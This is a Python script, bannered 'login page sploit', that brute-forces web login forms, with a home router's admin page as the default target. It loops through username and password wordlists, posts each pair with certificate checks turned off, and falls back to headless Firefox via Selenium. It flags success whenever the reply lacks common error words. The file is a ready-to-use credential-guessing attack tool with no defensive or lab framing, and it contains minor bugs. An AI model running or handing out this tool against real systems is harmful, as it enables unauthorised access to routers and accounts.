# chmod +x /PATH-TO/selenium/webdriver/common/linux/selenium-manager

import requests
import sys
from requests_html import HTMLSession
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

line1 = "__        _______ ____"
line2 = "\ \      / /  ___/ ___| YOUR"
line3 = " \ \ /\ / /| |_  \___ \ LOGIN"
line4 = "  \ V  V / |  _|  ___) |PAGE"
line5 = "   \_/\_/  |_|   |____/ SPLOIT"

print(line1)
print(line2)
print(line3)
print(line4)
print(line5)

usage = input("Show URL usage? y/n: ")
if usage.lower() == "y":
    print("Enter the login page URL, for example: https://site.com:1234/login-page/login.html ")
    print("- The file depends on how the login page was created, simply look at the login page URL and see if it has a file name. If not, just don't put anything after the URL.")
    print("- The port depends on whether the site supports HTTP or HTTPS. If it's on port 443, use HTTPS in the URL. If the site uses port 80, use HTTP in the URL. Or if the site has another service port, simply specify it in the URL.")
    print("URL format: http/https://<url>:<port>/<directory>/<login-file>")
else:
    pass

URL = input("Router's ip (default: http://192.168.1.1) : ") # Be sure about the router ip

if not URL:
    URL = 'http://192.168.1.1'

EXPRESSIONS = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"} #you can add your own login page errors messages here

def brute_with_selenium(username, password):
    options = Options()
    options.headless = True  
    driver = webdriver.Firefox(options=options)

    try:
        driver.get(URL)
        username_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )
        password_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "password"))
        )
        username_input.send_keys(username)
        password_input.send_keys(password)
        password_input.submit()

        driver_lower_content = driver.page_source.lower().encode('utf-8')

        if not any(item in driver_lower_content for item in EXPRESSIONS):
            print("\nBrute Forcing...")
            print("[+] Username: ", username)
            print("[+] Password: ", password)
            print("Server Response:", driver.page_source.encode('utf-8'))
            sys.exit()
    finally:
        driver.quit()

def brute_with_requests(username, password):
    a = requests.post(URL, data={'username': username, 'password': password}, verify=False)
    r_content = a.content.lower()
    if not any(item in r_content for item in EXPRESSIONS):
        print("\nBrute Forcing...")
        print("[+] Username: ", username)
        print("[+] Password: ", password)
        print("Server Response:", r.content)
        sys.exit()

def brute(username, password):
    try:
        brute_with_requests(username, password)
    except requests.exceptions.SSLError as e:
        print("Erro de SSL:", e)
        sys.exit(1)

def main():
    combinations_tested = 0
    use_selenium = False

    while True:
        usernames_file = input("Usernames file location (default: username.txt): ")
        if not usernames_file:
            usernames_file = "usernames.txt"
        passwords_file = input("Passwords file location (default: password.txt): ")
        if not passwords_file:
            passwords_file = "passwords.txt"

        try:
            with open(usernames_file, "r") as user_file:
                usernames = [u.strip() for u in user_file.readlines()]
            with open(passwords_file, "r") as pass_file:
                passwords = [p.strip() for p in pass_file.readlines()]
            break
        except FileNotFoundError:
            print("One or both files not found. Please provide valid file locations.")
        except PermissionError:
            print("Permission denied. Please check file permissions and try again.")
        except Exception as e:
            print(f"An error occurred while loading files: {e}")
    total_combinations = len(usernames) * len(passwords)

    try:
        for username in usernames:
            for password in passwords:
                combinations_tested += 1
                sys.stdout.write("\rCombinations tested: %d/%d" % (combinations_tested, total_combinations))
                sys.stdout.flush()

                if use_selenium or any(brute(username, password) for item in EXPRESSIONS):
                    use_selenium = True
                    brute_with_selenium(username, password)
    except KeyboardInterrupt:
        print("\n\033[91mExiting...\033[0m")

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    main()
